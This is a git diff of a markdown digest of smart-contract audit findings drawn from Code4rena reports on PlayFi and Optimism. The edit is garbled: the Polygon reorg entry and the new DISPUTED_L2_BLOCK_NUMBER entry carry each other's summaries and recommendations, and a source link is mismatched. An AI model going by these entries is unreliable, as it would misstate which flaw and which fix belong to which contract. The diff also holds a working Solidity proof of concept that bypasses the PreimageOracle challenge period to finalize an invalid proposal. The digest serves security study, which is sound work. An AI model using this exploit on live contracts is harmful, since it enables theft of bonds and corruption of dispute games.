@@ -391,9 +391,9 @@ Authors: [Eta](https://twitter.com/pwhattie), looking forward to your joining
 
 ### Polygon reorgs
 
-- Summary: The `PlayFiLicenseSale` contract had a vulnerability where reorgs on the Polygon network could result in licenses being sold at a price of 0. This issue occurred because the price of the licenses (`tiers[1].price`) could be set in a later block than the user's claim transaction, which relies on different variables.
+- Summary: Invalid handling of the `DISPUTED_L2_BLOCK_NUMBER` can lead to a denial-of-service (DoS) scenario. Specifically, the `DISPUTED_L2_BLOCK_NUMBER` passed to the VM is calculated as `starting block + trace index + 1`, potentially allowing an attacker to submit a redemption request that prevents further valid requests from being processed. This occurs because the VM's operations are not constrained to the claimed block and could incorrectly validate or invalidate claims.
 
-- Impact & Recommendation: Ensure a sufficient time interval between the price setting transaction and the status update transaction, or to add a check to revert if `tiers[1].price` is zero.
+- Impact & Recommendation: Cap the `DISPUTED_L2_BLOCK_NUMBER` at the claimed L2 block number to ensure the VM does not process blocks beyond this limit.
   <br> 🐬: [Source](https://code4rena.com/reports/2024-06-playfi-proleague#m-01-Reorgs-may-cause-licenses-to-be-sold-at-0-price) & [Report](https://code4rena.com/reports/2024-06-playfi-proleague)
 
   <details><summary>POC</summary>
@@ -412,3 +412,130 @@ Authors: [Eta](https://twitter.com/pwhattie), looking forward to your joining
   ```
 
   </details>
+
+## 9. [High] Invalid DISPUTED_L2_BLOCK_NUMBER is passed to VM
+
+### Cap DISPUTED_L2_BLOCK_NUMBER
+
+- Summary: The `PlayFiLicenseSale` contract had a vulnerability where reorgs on the Polygon network could result in licenses being sold at a price of 0. This issue occurred because the price of the licenses (`tiers[1].price`) could be set in a later block than the user's claim transaction, which relies on different variables.
+
+- Impact & Recommendation: Ensure a sufficient time interval between the price setting transaction and the status update transaction, or to add a check to revert if `tiers[1].price` is zero.
+  <br> 🐬: [Source](https://code4rena.com/reports/2024-07-optimism#h-01-Reorgs-may-cause-licenses-to-be-sold-at-0-price) & [Report](https://code4rena.com/reports/2024-07-optimism)
+
+<details><summary>POC</summary>
+
+```solidity
+        /// @inheritdoc IFaultDisputeGame
+        function addLocalData(uint256 _ident, uint256 _execLeafIdx, uint256 _partOffset) external {
+            // INVARIANT: Local data can only be added if the game is currently in progress.
+            if (status != GameStatus.IN_PROGRESS) revert GameNotInProgress();
+            (Claim starting, Position startingPos, Claim disputed, Position disputedPos) =
+                _findStartingAndDisputedOutputs(_execLeafIdx);
+            Hash uuid = _computeLocalContext(starting, startingPos, disputed, disputedPos);
+            IPreimageOracle oracle = VM.oracle();
+            if (_ident == LocalPreimageKey.L1_HEAD_HASH) {
+                // Load the L1 head hash
+                oracle.loadLocalData(_ident, uuid.raw(), l1Head().raw(), 32, _partOffset);
+            } else if (_ident == LocalPreimageKey.STARTING_OUTPUT_ROOT) {
+                // Load the starting proposal's output root.
+                oracle.loadLocalData(_ident, uuid.raw(), starting.raw(), 32, _partOffset);
+            } else if (_ident == LocalPreimageKey.DISPUTED_OUTPUT_ROOT) {
+                // Load the disputed proposal's output root
+                oracle.loadLocalData(_ident, uuid.raw(), disputed.raw(), 32, _partOffset);
+            } else if (_ident == LocalPreimageKey.DISPUTED_L2_BLOCK_NUMBER) {
+                // Load the disputed proposal's L2 block number as a big-endian uint64 in the
+                // high order 8 bytes of the word.
+
+                // block number.
+                uint256 l2Number = startingOutputRoot.l2BlockNumber + disputedPos.traceIndex(SPLIT_DEPTH) + 1;
+                oracle.loadLocalData(_ident, uuid.raw(), bytes32(l2Number << 0xC0), 8, _partOffset);
+            } else if (_ident == LocalPreimageKey.CHAIN_ID) {
+                // Load the chain ID as a big-endian uint64 in the high order 8 bytes of the word.
+                oracle.loadLocalData(_ident, uuid.raw(), bytes32(L2_CHAIN_ID << 0xC0), 8, _partOffset);
+            } else {
+                revert InvalidLocalIdent();
+            }
+        }
+
+```
+
+</details>
+
+## 10. [High] An attacker can bypass the challenge period during LPP finalization
+
+### Initialize timestamp
+
+- Summary: `squeezeLPP` function allows attackers to bypass the challenge period for Large Preimage Proposals (LPPs). The challenge period, which is intended to enable verification of LPP correctness, can be circumvented because the `timestamp` field in LPP metadata is not initialized during the proposal setup phase. Consequently, an attacker can finalize an LPP immediately after making several calls with `_finalize` set to `false`, as the timestamp remains uninitialized and does not trigger the challenge period check. This flaw enables malicious actors to finalize invalid LPPs without the opportunity for challenges, disrupting the integrity of the LPP process.
+
+- Impact & Recommendation: `squeezeLPP` function should be updated to check if the proposal was finalized and if the challenge period is still active.
+  <br> 🐬: [Source](https://code4rena.com/reports/2024-07-optimism#h-05-An-attacker-can-bypass-the-challenge-period-during-LPP-finalization) & [Report](https://code4rena.com/reports/2024-07-optimism)
+
+<details><summary>POC</summary>
+
+```solidity
+
+contract PreimageOracle_LargePreimageProposals_Test is Test {
+    ...
+    function test_squeeze_challengePeriodActive_not_revert() public {
+        //! Set an appropriate value for block.timestamp.
+        vm.warp(1721643596);
+        // Allocate the preimage data.
+        bytes memory data = new bytes(136);
+        for (uint256 i; i < data.length; i++) {
+            data[i] = 0xFF;
+        }
+        bytes memory phonyData = new bytes(136);
+        // Initialize the proposal.
+        oracle.initLPP{ value: oracle.MIN_BOND_SIZE() }(TEST_UUID, 0, uint32(data.length));
+        // Add the leaves to the tree with mismatching state commitments.
+        LibKeccak.StateMatrix memory stateMatrix;
+        bytes32[] memory stateCommitments = _generateStateCommitments(stateMatrix, data);
+        //! The attacker doesn't set _finalize to true but pads the data correctly.
+        oracle.addLeavesLPP(TEST_UUID, 0, LibKeccak.padMemory(phonyData), stateCommitments, false);
+        // Construct the leaf preimage data for the blocks added.
+        LibKeccak.StateMatrix memory matrix;
+        PreimageOracle.Leaf[] memory leaves = _generateLeaves(matrix, phonyData);
+        leaves[0].stateCommitment = stateCommitments[0];
+        leaves[1].stateCommitment = stateCommitments[1];
+        // Create a proof array with 16 elements.
+        bytes32[] memory preProof = new bytes32[](16);
+        preProof[0] = _hashLeaf(leaves[1]);
+        bytes32[] memory postProof = new bytes32[](16);
+        postProof[0] = _hashLeaf(leaves[0]);
+        for (uint256 i = 1; i < preProof.length; i++) {
+            bytes32 zeroHash = oracle.zeroHashes(i);
+            preProof[i] = zeroHash;
+            postProof[i] = zeroHash;
+        }
+        // Finalize the proposal.
+        //! This call must revert since the challenge period has not passed.
+        //! However, it does not revert.
+        // vm.expectRevert(ActiveProposal.selector);
+        uint256 balanceBefore = address(this).balance;
+        oracle.squeezeLPP({
+            _claimant: address(this),
+            _uuid: TEST_UUID,
+            _stateMatrix: _stateMatrixAtBlockIndex(data, 1),
+            _preState: leaves[0],
+            _preStateProof: preProof,
+            _postState: leaves[1],
+            _postStateProof: postProof
+        });
+        assertEq(address(this).balance, balanceBefore + oracle.MIN_BOND_SIZE());
+        assertEq(oracle.proposalBonds(address(this), TEST_UUID), 0);
+        bytes32 finalDigest = _setStatusByte(keccak256(data), 2);
+        //! The commented value is the correct value for the preimage part.
+        // bytes32 expectedPart = bytes32((~uint256(0) & ~(uint256(type(uint64).max) << 192)) | (data.length << 192));
+        //! This value is not correct for the preimage part.
+        bytes32 phonyPart = 0x0000000000000088000000000000000000000000000000000000000000000000;
+        //! An invalid LPP is finalized and can be used in the MIPS.sol
+        assertTrue(oracle.preimagePartOk(finalDigest, 0));
+        assertEq(oracle.preimageLengths(finalDigest), phonyData.length);
+        assertEq(oracle.preimageParts(finalDigest, 0), phonyPart);
+    }
+    ...
+}
+
+```
+
+</details>
